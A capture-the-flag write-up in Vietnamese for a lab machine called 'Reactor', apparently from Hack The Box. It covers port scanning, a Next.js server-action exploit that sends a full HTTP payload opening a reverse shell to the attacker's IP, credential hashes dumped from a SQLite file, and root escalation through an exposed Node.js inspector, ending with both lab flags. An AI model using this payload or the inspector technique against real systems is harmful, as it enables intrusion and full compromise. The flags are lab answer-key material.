# Reactor

<figure><img src="../../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>

## RECON

### Port scan

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.129.6.9 -r0-65400   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.6.9:22
Open 10.129.6.9:3000
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-26 05:25 -0400
Initiating Ping Scan at 05:25
Scanning 10.129.6.9 [4 ports]
Completed Ping Scan at 05:25, 0.34s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:25
Completed Parallel DNS resolution of 1 host. at 05:25, 0.51s elapsed
DNS resolution of 1 IPs took 0.52s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 05:25
Scanning 10.129.6.9 [2 ports]
Discovered open port 22/tcp on 10.129.6.9
Discovered open port 3000/tcp on 10.129.6.9
Completed SYN Stealth Scan at 05:25, 0.39s elapsed (2 total ports)
Nmap scan report for 10.129.6.9
Host is up, received echo-reply ttl 63 (0.29s latency).
Scanned at 2026-05-26 05:25:16 EDT for 1s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63

```

Sau khi chạy `rustscan` để quét full port thì ta có được 2 port là `22` và`3000`&#x20;



dựa vào thông tin bên dưới thì ta biết được port `3000` đang chạy 1 service web có sử dụng Nextjs

```bash
(base) ┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p22,3000 10.129.6.9
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-26 05:23 -0400
Nmap scan report for 10.129.6.9
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Tue, 26 May 2026 09:24:04 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Tue, 26 May 2026 09:24:11 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Tue, 26 May 2026 09:24:14 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=5/26%Time=6A1566B5%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nVary:\x20RSC,\x20Next-Router-S
SF:tate-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetch,\x2
SF:0Accept-Encoding\r\nx-nextjs-cache:\x20HIT\r\nx-nextjs-prerender:\x201\
SF:r\nx-nextjs-stale-time:\x204294967294\r\nX-Powered-By:\x20Next\.js\r\nC
SF:ache-Control:\x20s-maxage=31536000,\x20\r\nETag:\x20\"p02u6gnhufd8t\"\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2017
SF:175\r\nDate:\x20Tue,\x2026\x20May\x202026\x2009:24:04\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n<!DOCTYPE\x20html><html\x20lang=\"en\"><head><meta
SF:\x20charSet=\"utf-8\"/><meta\x20name=\"viewport\"\x20content=\"width=de
SF:vice-width,\x20initial-scale=1\"/><link\x20rel=\"stylesheet\"\x20href=\
SF:"/_next/static/css/414e1be982bc8557\.css\"\x20data-precedence=\"next\"/
SF:><link\x20rel=\"preload\"\x20as=\"script\"\x20fetchPriority=\"low\"\x20
SF:href=\"/_next/static/chunks/webpack-db0a529a99835594\.js\"/><script\x20
SF:src=\"/_next/static/chunks/4bd1b696-80bcaf75e1b4285e\.js\"\x20async=\"\
SF:"></script><script\x20src=\"/_next/static/chunks/517-d083b552e04dead1\.
SF:js\"\x20async=\"\"></script><script\x20s")%r(Help,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(NCP,2F,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptio
SF:ns,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20RSC,\x20Next-Rou
SF:ter-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-Segment-Prefetc
SF:h\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x20private,\x20n
SF:o-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nDate:\x20Tue,
SF:\x2026\x20May\x202026\x2009:24:11\x20GMT\r\nConnection:\x20close\r\n\r\
SF:n")%r(RTSPRequest,10C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nvary:\x20R
SF:SC,\x20Next-Router-State-Tree,\x20Next-Router-Prefetch,\x20Next-Router-
SF:Segment-Prefetch\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nCache-Control:\x
SF:20private,\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r
SF:\nDate:\x20Tue,\x2026\x20May\x202026\x2009:24:14\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.15 seconds

```

### Web Technology



<figure><img src="../../.gitbook/assets/image (823).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (822).png" alt=""><figcaption></figcaption></figure>

Dựa vào phiên bản của NextJS thì ta có thể phỏng đoán là nó có thể bị dính CVE react2shell

<figure><img src="../../.gitbook/assets/image (824).png" alt=""><figcaption></figcaption></figure>

## RCE&#x20;

### RCE Confirm

<figure><img src="../../.gitbook/assets/image (825).png" alt=""><figcaption></figcaption></figure>

### Reverse Shell

```http
POST / HTTP/1.1
Host: 10.129.6.9:3000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 950

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var net = process.mainModule.require('net'), cp = process.mainModule.require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect(4444, '10.10.14.205', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); throw Object.assign(new Error('NEXT_REDIRECT'), {digest: 'Shell sent!'});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

<figure><img src="../../.gitbook/assets/image (826).png" alt=""><figcaption></figcaption></figure>

sau khi có shell về thì ta check src thì thấy có 2 file khá là khả nghi là `.env` và `reactor.db`

<figure><img src="../../.gitbook/assets/image (827).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (828).png" alt=""><figcaption></figcaption></figure>



Khi đọc file db thì ta đã có được cred của các user trong hệ thống

<figure><img src="../../.gitbook/assets/image (829).png" alt=""><figcaption></figcaption></figure>

```bash
SQLite format 3
Mtablesensor_logssensor_logs
CREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
9tableusersusers
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
5engineer39d97110eafe2a9a68639812cd271e8eoperatorengineer@reactor.htbI
M'/admina203b22191d744a4e70ada5c101b17b8administratoradmin@reactor.htb
2025-12-28 14:32:01COOLANT_FLOW@2ffffffCAUTION3
2025-12-28 14:32:01PRESSURE_01@cffffffNOMINAL4
2025-12-28 14:32:01CORE_TEMP_01@tH
NOMINAL

```

ở đây ta tách dc 2 thông tin là :&#x20;

| ID | Username   | Password Hash                      | Role            | Email                  |
| -- | ---------- | ---------------------------------- | --------------- | ---------------------- |
| 1  | `engineer` | `39d97110eafe2a9a68639812cd271e8e` | `operator`      | `engineer@reactor.htb` |
| 2  | `admin`    | `a203b22191d744a4e70ada5c101b17b8` | `administrator` | `admin@reactor.htb`    |

<figure><img src="../../.gitbook/assets/image (830).png" alt=""><figcaption></figcaption></figure>

Ta có được mật khẩu của `engineer` là `reactor1`



## Lateral Moverment

<figure><img src="../../.gitbook/assets/image (831).png" alt=""><figcaption></figcaption></figure>

### Flag user

```
3b9fe18a341a96b2a5e41702ebfac9b0
```



## Privilege Escalation

Sau khi có shell với user `engineer`, tôi bắt đầu kiểm tra các service đang listen trên máy bằng `netstat`.

```bash
Cengineer@reactor:~$ netstat -tulnp
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9229          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::3000                 :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   


```

Kết quả cho thấy có một service đáng chú ý đang listen trên localhost tại port `9229`

Port `9229` thường được sử dụng bởi **Node.js Inspector**, một debugging interface của Node.js. Vì service này chỉ bind trên `127.0.0.1`, nó không thể truy cập trực tiếp từ bên ngoài, nhưng có thể truy cập được từ shell hiện tại trên máy victim.

Tiếp theo, tôi kiểm tra các process Node.js đang chạy:

```bash
engineer@reactor:~$ ps aux | grep node
node        1396  0.1  3.5 11844508 139460 ?     Ssl  May25   1:41 next-server (v15.0.3)
root        1398  0.0  1.2 1067736 49808 ?       Ssl  May25   0:03 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
engineer    3821  0.0  0.0   6544  2280 pts/0    S+   10:35   0:00 grep --color=auto node
```

Ta thấy có 1 Process quan trọng chạt với quyền `root`&#x20;

Process này chạy bằng user `root` và bật Node.js inspector trên `127.0.0.1:9229`. Điều này có nghĩa là nếu attach được vào debugger, các expression được thực thi trong context của process này sẽ chạy với quyền `root`.

Tôi sử dụng `node inspect` để kết nối vào Node.js inspector:

```bash
engineer@reactor:~$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok
debug> exec('process.getuid && process.getuid()')
0
```

Đầu tiên, tôi kiểm tra UID của process đang debug:

Và xác định được nó đang chạy ở quyền `root`

```bash
debug> exec('process.mainModule && process.mainModule.require("child_process").execSync("id").toString()')
'uid=0(root) gid=0(root) groups=0(root)\n'
```

Và cuối cùng thì ta sẽ đọc flag

```bash
debug> exec('process.mainModule && process.mainModule.require("child_process").execSync("cat /root/root.txt").toString()')
'a4d5b5ac802765d5f44456686cb72741\n'
```

### Flag root

```
a4d5b5ac802765d5f44456686cb72741
```
